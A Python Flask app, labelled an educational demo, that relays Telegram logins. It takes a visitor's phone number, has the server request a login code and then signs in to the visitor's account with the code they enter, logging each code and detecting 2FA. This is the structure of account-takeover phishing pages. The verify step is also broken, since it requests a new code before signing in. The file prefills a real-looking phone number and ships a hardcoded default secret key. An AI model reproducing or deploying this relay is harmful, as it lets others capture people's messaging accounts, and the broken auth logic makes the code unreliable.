import os
import asyncio
import logging
import time
from flask import Flask, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneNumberInvalidError, 
    PhoneCodeExpiredError,
    FloodWaitError
)

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

def load_api_keys():
    """Загружаем API ключи с проверкой"""
    try:
        from dotenv import load_dotenv
        load_dotenv()
        logger.info("✅ .env файл загружен")
    except ImportError:
        logger.warning("⚠️ python-dotenv не установлен")
    
    # Получаем ключи из переменных окружения
    api_id = os.getenv('TELEGRAM_API_ID')
    api_hash = os.getenv('TELEGRAM_API_HASH')
    secret_key = os.getenv('SECRET_KEY', 'educational-demo-secret-key-2024')
    
    return api_id, api_hash, secret_key

# Загружаем ключи при старте
API_ID, API_HASH, SECRET_KEY = load_api_keys()
app.secret_key = SECRET_KEY

class TelegramAuthTester:
    def __init__(self):
        self.api_id = None
        self.api_hash = None
        self.initialized = False
        self.initialize_client()
        
    def initialize_client(self):
        """Инициализируем клиент с проверкой ключей"""
        try:
            if not API_ID or not API_HASH:
                logger.error("❌ API ключи не установлены")
                self.initialized = False
                return
                
            self.api_id = int(API_ID)
            self.api_hash = API_HASH
            self.initialized = True
            logger.info(f"✅ Тестер аутентификации инициализирован с API_ID: {self.api_id}")
            
        except ValueError as e:
            logger.error(f"❌ Неверный формат API_ID: {e}")
            self.initialized = False
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации: {e}")
            self.initialized = False
        
    async def process_auth(self, phone_number, code=None):
        """Универсальный метод для обработки аутентификации"""
        if not self.initialized:
            return {'success': False, 'error': 'Клиент не инициализирован'}
            
        client = None
        try:
            # Создаем нового клиента для каждого запроса
            client = TelegramClient(
                StringSession(),
                self.api_id,
                self.api_hash
            )
            
            await client.connect()
            
            if not code:
                # Запрос кода
                logger.info(f"📱 Запрос кода для: {phone_number}")
                sent_code = await client.send_code_request(phone_number)
                
                return {
                    'success': True,
                    'message': 'Код отправлен',
                    'phone_code_hash': sent_code.phone_code_hash,
                    'is_test': True
                }
            else:
                # Верификация кода
                logger.info(f"🔐 Верификация кода {code} для {phone_number}")
                
                # Получаем phone_code_hash заново
                sent_code = await client.send_code_request(phone_number)
                
                try:
                    result = await client.sign_in(
                        phone=phone_number,
                        code=code,
                        phone_code_hash=sent_code.phone_code_hash
                    )
                    
                    logger.info("✅ Успешная аутентификация")
                    return {
                        'success': True,
                        'message': 'Аутентификация успешна',
                        'is_test': True
                    }
                    
                except SessionPasswordNeededError:
                    logger.info("🔒 Требуется 2FA пароль")
                    return {
                        'success': True,
                        'message': 'Требуется пароль 2FA',
                        'needs_password': True
                    }
                    
                except PhoneCodeInvalidError:
                    logger.warning("⚠️ Неверный код")
                    return {'success': False, 'error': 'Неверный код подтверждения'}
                    
                except PhoneCodeExpiredError:
                    logger.warning("⏰ Код истек")
                    return {'success': False, 'error': 'Код истек. Запросите новый.'}
                    
                except FloodWaitError as e:
                    logger.warning(f"⏳ Flood wait: {e.seconds} секунд")
                    return {
                        'success': False, 
                        'error': f'Слишком много попыток. Попробуйте через {e.seconds} секунд.'
                    }
                    
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            return {'success': False, 'error': f'Ошибка: {str(e)}'}
        finally:
            if client:
                try:
                    await client.disconnect()
                except:
                    pass

# Инициализация
auth_tester = TelegramAuthTester()

def run_async(coro):
    """Запуск асинхронных функций"""
    return asyncio.run(coro)

# 🎯 Образовательные маршруты
@app.route('/')
def educational_demo():
    status = "✅ СИСТЕМА ГОТОВА" if auth_tester.initialized else "❌ ПРОВЕРЬТЕ API КЛЮЧИ"
    status_color = "status-success" if auth_tester.initialized else "status-error"
    
    return f'''
<!DOCTYPE html>
<html>
<head>
    <title>Educational Auth Demo</title>
    <style>
        body {{ 
            font-family: Arial, sans-serif; 
            margin: 40px;
            background: #f5f5f5;
        }}
        .container {{ 
            max-width: 500px; 
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .input {{ 
            width: 100%; 
            padding: 12px; 
            margin: 8px 0; 
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }}
        .btn {{ 
            background: #007bff; 
            color: white; 
            padding: 12px 24px; 
            border: none; 
            border-radius: 5px;
            cursor: pointer; 
            font-size: 16px;
            width: 100%;
            margin-top: 10px;
        }}
        .btn:hover {{ background: #0056b3; }}
        .btn:disabled {{ background: #6c757d; cursor: not-allowed; }}
        .alert {{ 
            padding: 12px; 
            margin: 15px 0; 
            border-radius: 5px;
            border: 1px solid;
        }}
        .success {{ background: #d4edda; color: #155724; border-color: #c3e6cb; }}
        .error {{ background: #f8d7da; color: #721c24; border-color: #f5c6cb; }}
        .info {{ background: #d1ecf1; color: #0c5460; border-color: #bee5eb; }}
        .warning {{ background: #fff3cd; color: #856404; border-color: #ffeaa7; }}
        .status {{ 
            padding: 10px;
            border-radius: 5px;
            text-align: center;
            margin-bottom: 20px;
            font-weight: bold;
        }}
        .status-success {{ background: #d4edda; color: #155724; }}
        .status-error {{ background: #f8d7da; color: #721c24; }}
        .debug-info {{
            background: #e9ecef;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
            margin: 10px 0;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Educational Auth Demo</h1>
        <p>Демонстрация механизмов аутентификации (ТОЛЬКО ДЛЯ ОБРАЗОВАНИЯ)</p>
        
        <div class="status {status_color}">
            {status}
        </div>
        
        <div class="alert warning">
            ⚠️ <strong>ВНИМАНИЕ:</strong> Это образовательная демонстрация. Используйте только тестовые данные!
        </div>

        <div class="debug-info">
            <strong>Отладочная информация:</strong><br>
            API_ID: {API_ID if API_ID else 'Не установлен'}<br>
            API_HASH: {'Установлен' if API_HASH else 'Не установлен'}
        </div>
        
        <div id="step1">
            <h3>Тест аутентификации</h3>
            <input type="text" id="phone" class="input" placeholder="Введите номер телефона" value="+79220470330">
            <button class="btn" onclick="requestCode()" id="requestBtn">Получить код</button>
        </div>
        
        <div id="step2" style="display:none;">
            <h3>Введите код из Telegram</h3>
            <input type="text" id="code" class="input" placeholder="Введите 5-значный код" maxlength="5">
            <button class="btn" onclick="verifyCode()" id="verifyBtn">Проверить код</button>
        </div>
        
        <div id="results"></div>
        
        <div class="alert info">
            <strong>Образовательная цель:</strong> Изучение механизмов аутентификации в мессенджерах
        </div>
    </div>

    <script>
        let currentPhone = '';

        function showAlert(message, type) {{
            const results = document.getElementById('results');
            results.innerHTML = '<div class="alert ' + type + '">' + message + '</div>';
        }}

        async function requestCode() {{
            const phone = document.getElementById('phone').value.trim();
            currentPhone = phone;

            if (!phone) {{
                showAlert('Введите номер телефона', 'error');
                return;
            }}

            const btn = document.getElementById('requestBtn');
            btn.disabled = true;
            btn.textContent = 'Отправка...';

            try {{
                const response = await fetch('/api/auth/request', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{phone: phone}})
                }});
                
                const data = await response.json();
                
                if (data.success) {{
                    document.getElementById('step2').style.display = 'block';
                    showAlert('✅ Код отправлен! Проверьте Telegram и введите код.', 'success');
                    document.getElementById('code').focus();
                }} else {{
                    showAlert('❌ ' + data.error, 'error');
                }}
            }} catch (error) {{
                showAlert('❌ Ошибка сети: ' + error, 'error');
            }} finally {{
                btn.disabled = false;
                btn.textContent = 'Получить код';
            }}
        }}

        async function verifyCode() {{
            const code = document.getElementById('code').value.trim();

            if (!code || code.length !== 5) {{
                showAlert('Введите 5-значный код из Telegram', 'error');
                return;
            }}

            const btn = document.getElementById('verifyBtn');
            btn.disabled = true;
            btn.textContent = 'Проверка...';

            try {{
                const response = await fetch('/api/auth/verify', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        phone: currentPhone,
                        code: code
                    }})
                }});
                
                const data = await response.json();
                
                if (data.success) {{
                    showAlert('✅ ' + data.message, 'success');
                    document.getElementById('step2').style.display = 'none';
                    document.getElementById('code').value = '';
                }} else {{
                    showAlert('❌ ' + data.error, 'error');
                    document.getElementById('code').value = '';
                    document.getElementById('code').focus();
                }}
            }} catch (error) {{
                showAlert('❌ Ошибка сети: ' + error, 'error');
            }} finally {{
                btn.disabled = false;
                btn.textContent = 'Проверить код';
            }}
        }}

        document.getElementById('phone').addEventListener('keypress', function(e) {{
            if (e.key === 'Enter') requestCode();
        }});
        
        document.getElementById('code').addEventListener('keypress', function(e) {{
            if (e.key === 'Enter') verifyCode();
        }});

        // Auto-submit when 5 digits entered
        document.getElementById('code').addEventListener('input', function(e) {{
            if (e.target.value.length === 5) {{
                verifyCode();
            }}
        }});
    </script>
</body>
</html>
'''

@app.route('/api/auth/request', methods=['POST'])
def auth_request():
    """Запрос кода аутентификации"""
    data = request.get_json()
    phone = data.get('phone', '').strip()
    
    if not phone:
        return jsonify({'success': False, 'error': 'Введите номер телефона'})
    
    result = run_async(auth_tester.process_auth(phone))
    return jsonify(result)

@app.route('/api/auth/verify', methods=['POST'])
def auth_verify():
    """Верификация кода"""
    data = request.get_json()
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    
    if not phone or not code:
        return jsonify({'success': False, 'error': 'Введите номер и код'})
    
    result = run_async(auth_tester.process_auth(phone, code))
    return jsonify(result)

@app.route('/status')
def status():
    """Проверка статуса API"""
    return jsonify({
        'api_initialized': auth_tester.initialized,
        'api_id_set': bool(API_ID),
        'api_hash_set': bool(API_HASH)
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
